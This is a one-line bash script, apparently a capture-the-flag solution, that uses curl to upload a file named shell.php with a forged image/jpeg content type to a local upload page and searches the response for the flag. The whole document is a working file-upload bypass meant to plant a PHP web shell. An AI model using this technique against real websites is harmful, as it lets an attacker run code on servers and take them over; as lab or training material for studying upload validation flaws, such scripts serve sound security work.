#!/bin/bash

curl -X POST -F "Upload=Upload" -F "uploaded=@./shell.php;type=image/jpeg" "http://localhost:8080/index.php?page=upload" | grep "The flag is"
